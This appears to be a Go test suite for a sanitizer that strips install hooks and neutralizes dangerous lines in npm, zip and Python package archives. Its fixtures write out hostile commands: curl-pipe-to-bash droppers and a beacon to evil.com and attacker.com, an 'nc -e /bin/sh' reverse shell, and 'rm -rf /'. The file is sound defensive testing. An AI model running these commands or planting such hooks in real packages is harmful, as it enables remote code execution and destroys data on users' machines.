package sanitizer_test

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"encoding/json"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"bonjoski/argus/internal/sanitizer"
)

// helper to build in-memory tar.gz from map[filename]content
func createTarGz(t *testing.T, files map[string][]byte) []byte {
	t.Helper()
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)

	for name, content := range files {
		hdr := &tar.Header{
			Name:     name,
			Mode:     0644,
			Size:     int64(len(content)),
			Typeflag: tar.TypeReg,
		}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatalf("failed to write tar header: %v", err)
		}
		if _, err := tw.Write(content); err != nil {
			t.Fatalf("failed to write tar body: %v", err)
		}
	}

	if err := tw.Close(); err != nil {
		t.Fatalf("failed to close tar writer: %v", err)
	}
	if err := gw.Close(); err != nil {
		t.Fatalf("failed to close gzip writer: %v", err)
	}

	return buf.Bytes()
}

// helper to read all entries from tar.gz into map[filename]content
func readTarGz(t *testing.T, data []byte) map[string][]byte {
	t.Helper()
	files := make(map[string][]byte)
	gzr, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		t.Fatalf("failed to create gzip reader: %v", err)
	}
	defer gzr.Close()

	tr := tar.NewReader(gzr)
	for {
		hdr, err := tr.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			t.Fatalf("failed to read tar next entry: %v", err)
		}
		content, err := io.ReadAll(tr)
		if err != nil {
			t.Fatalf("failed to read tar entry content: %v", err)
		}
		files[hdr.Name] = content
	}

	return files
}

// helper to create in-memory zip
func createZip(t *testing.T, files map[string][]byte) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)

	for name, content := range files {
		w, err := zw.Create(name)
		if err != nil {
			t.Fatalf("failed to create zip entry: %v", err)
		}
		if _, err := w.Write(content); err != nil {
			t.Fatalf("failed to write zip entry content: %v", err)
		}
	}

	if err := zw.Close(); err != nil {
		t.Fatalf("failed to close zip writer: %v", err)
	}

	return buf.Bytes()
}

func TestNeutralizeArchive_NPM_LifecycleHooks(t *testing.T) {
	pkgJSON := `{
  "name": "malicious-tools",
  "version": "1.0.0",
  "scripts": {
    "test": "jest",
    "preinstall": "node preinstall.js",
    "install": "curl -sSL https://evil.com/dropper | bash",
    "postinstall": "rm -rf /tmp/data && child_process.execSync('bad')",
    "preuninstall": "curl https://evil.com/beacon",
    "postuninstall": "echo 'uninstalled'"
  },
  "dependencies": {
    "lodash": "^4.17.21"
  }
}`

	preinstallJS := `const { execSync } = require('child_process');
execSync('curl -s https://evil.com/x | sh');
`
	indexJS := `console.log("Safe application code");`
	readmeMD := `# Malicious Tools`

	tarData := createTarGz(t, map[string][]byte{
		"package/package.json":    []byte(pkgJSON),
		"package/preinstall.js":   []byte(preinstallJS),
		"package/index.js":        []byte(indexJS),
		"package/README.md":       []byte(readmeMD),
		"package/bin/binary.node": []byte("\x7fELFfakebinarypayload"),
	})

	res, err := sanitizer.NeutralizeBytes(tarData, "malicious-tools-1.0.0.tgz")
	if err != nil {
		t.Fatalf("NeutralizeBytes failed: %v", err)
	}

	if len(res.StrippedHooks) != 5 {
		t.Errorf("expected 5 stripped hooks, got %d: %+v", len(res.StrippedHooks), res.StrippedHooks)
	}

	// Verify binary was stripped
	if len(res.RemovedFiles) != 1 || res.RemovedFiles[0] != "package/bin/binary.node" {
		t.Errorf("expected package/bin/binary.node to be removed, got: %v", res.RemovedFiles)
	}

	// Verify preinstall.js was neutralized
	if len(res.NeutralizedFiles) != 1 || res.NeutralizedFiles[0] != "package/preinstall.js" {
		t.Errorf("expected package/preinstall.js to be neutralized, got: %v", res.NeutralizedFiles)
	}

	// Unpack and verify neutralized content
	unpacked := readTarGz(t, res.Data)

	// Check package.json
	cleanPkgRaw, ok := unpacked["package/package.json"]
	if !ok {
		t.Fatalf("package/package.json missing from neutralized archive")
	}

	var cleanPkg map[string]any
	if err := json.Unmarshal(cleanPkgRaw, &cleanPkg); err != nil {
		t.Fatalf("failed to parse clean package.json: %v", err)
	}

	scripts := cleanPkg["scripts"].(map[string]any)
	if _, exists := scripts["preinstall"]; exists {
		t.Errorf("preinstall still present in package.json")
	}
	if _, exists := scripts["install"]; exists {
		t.Errorf("install still present in package.json")
	}
	if _, exists := scripts["postinstall"]; exists {
		t.Errorf("postinstall still present in package.json")
	}
	if _, exists := scripts["preuninstall"]; exists {
		t.Errorf("preuninstall still present in package.json")
	}
	if _, exists := scripts["postuninstall"]; exists {
		t.Errorf("postuninstall still present in package.json")
	}

	// Verify benign script 'test' is preserved
	if testCmd, exists := scripts["test"]; !exists || testCmd != "jest" {
		t.Errorf("benign test script was modified or removed: %v", testCmd)
	}

	// Verify dependencies preserved
	deps := cleanPkg["dependencies"].(map[string]any)
	if deps["lodash"] != "^4.17.21" {
		t.Errorf("dependencies were not preserved correctly: %v", deps)
	}

	// Verify index.js and README.md preserved intact
	if string(unpacked["package/index.js"]) != indexJS {
		t.Errorf("index.js was modified")
	}
	if string(unpacked["package/README.md"]) != readmeMD {
		t.Errorf("README.md was modified")
	}

	// Verify binary was removed
	if _, exists := unpacked["package/bin/binary.node"]; exists {
		t.Errorf("binary.node was not stripped from archive")
	}

	// Verify preinstall.js has commented out dangerous lines
	cleanPreinstall := string(unpacked["package/preinstall.js"])
	if !strings.Contains(cleanPreinstall, "[argus-neutralized]") {
		t.Errorf("preinstall.js was not neutralized with comment tags: %s", cleanPreinstall)
	}
}

func TestNeutralizeArchive_Python_SetupPy(t *testing.T) {
	setupPy := `from setuptools import setup
import os

os.system("curl -s http://attacker.com/rev | bash")

setup(
    name="dangerous-pkg",
    version="0.1.0",
    packages=["mypkg"],
)
`
	tarData := createTarGz(t, map[string][]byte{
		"setup.py":          []byte(setupPy),
		"mypkg/__init__.py": []byte(`__version__ = "0.1.0"`),
	})

	res, err := sanitizer.NeutralizeBytes(tarData, "dangerous-pkg-0.1.0.tar.gz")
	if err != nil {
		t.Fatalf("NeutralizeBytes failed: %v", err)
	}

	if len(res.NeutralizedFiles) != 1 || res.NeutralizedFiles[0] != "setup.py" {
		t.Errorf("expected setup.py to be neutralized, got: %v", res.NeutralizedFiles)
	}

	unpacked := readTarGz(t, res.Data)
	cleanSetup := string(unpacked["setup.py"])
	if !strings.Contains(cleanSetup, "# [argus-neutralized]") {
		t.Errorf("setup.py did not have dangerous os.system neutralized: %s", cleanSetup)
	}
	if !strings.Contains(cleanSetup, "name=\"dangerous-pkg\"") {
		t.Errorf("setup.py lost benign setup configuration: %s", cleanSetup)
	}
}

func TestNeutralizeArchive_ZipFormat(t *testing.T) {
	pkgJSON := `{
  "name": "zip-package",
  "version": "2.0.0",
  "scripts": {
    "postinstall": "nc -e /bin/sh evil.com 4444"
  }
}`
	zipData := createZip(t, map[string][]byte{
		"package.json": []byte(pkgJSON),
		"index.js":     []byte("module.exports = {};"),
	})

	res, err := sanitizer.NeutralizeBytes(zipData, "archive.zip")
	if err != nil {
		t.Fatalf("NeutralizeBytes on zip failed: %v", err)
	}

	if len(res.StrippedHooks) != 1 {
		t.Fatalf("expected 1 stripped hook, got %d", len(res.StrippedHooks))
	}

	zr, err := zip.NewReader(bytes.NewReader(res.Data), int64(len(res.Data)))
	if err != nil {
		t.Fatalf("failed to read neutralized zip: %v", err)
	}

	var foundPkgJSON bool
	for _, f := range zr.File {
		if f.Name == "package.json" {
			foundPkgJSON = true
			rc, err := f.Open()
			if err != nil {
				t.Fatalf("failed to open package.json: %v", err)
			}
			data, _ := io.ReadAll(rc)
			rc.Close()

			var pkg map[string]any
			_ = json.Unmarshal(data, &pkg)
			scripts := pkg["scripts"].(map[string]any)
			if _, exists := scripts["postinstall"]; exists {
				t.Errorf("postinstall still exists in neutralized zip")
			}
		}
	}

	if !foundPkgJSON {
		t.Errorf("package.json was missing from neutralized zip")
	}
}

func TestNeutralizeFile(t *testing.T) {
	tmpDir := t.TempDir()
	srcFile := filepath.Join(tmpDir, "sample.tgz")
	dstFile := filepath.Join(tmpDir, "sample.clean.tgz")

	pkgJSON := `{"name":"file-test","version":"1.0.0","scripts":{"install":"rm -rf /"}}`
	tarData := createTarGz(t, map[string][]byte{
		"package.json": []byte(pkgJSON),
	})

	if err := os.WriteFile(srcFile, tarData, 0644); err != nil {
		t.Fatalf("failed to write test src file: %v", err)
	}

	res, err := sanitizer.NeutralizeFile(srcFile, dstFile)
	if err != nil {
		t.Fatalf("NeutralizeFile failed: %v", err)
	}

	if len(res.StrippedHooks) != 1 {
		t.Errorf("expected 1 stripped hook, got %d", len(res.StrippedHooks))
	}

	// Verify dstFile was created on disk and is readable
	dstBytes, err := os.ReadFile(dstFile)
	if err != nil {
		t.Fatalf("failed to read dstFile: %v", err)
	}

	unpacked := readTarGz(t, dstBytes)
	cleanPkg := string(unpacked["package.json"])
	if strings.Contains(cleanPkg, "rm -rf /") {
		t.Errorf("dstFile still contains malicious install script: %s", cleanPkg)
	}
}

func TestNeutralizeArchive_EmptyOrInvalid(t *testing.T) {
	_, err := sanitizer.NeutralizeBytes(nil, "empty.tgz")
	if err == nil {
		t.Errorf("expected error on empty bytes")
	}

	_, err = sanitizer.NeutralizeBytes([]byte("garbage non-archive data"), "bad.tgz")
	if err == nil {
		t.Errorf("expected error on invalid tar archive")
	}
}
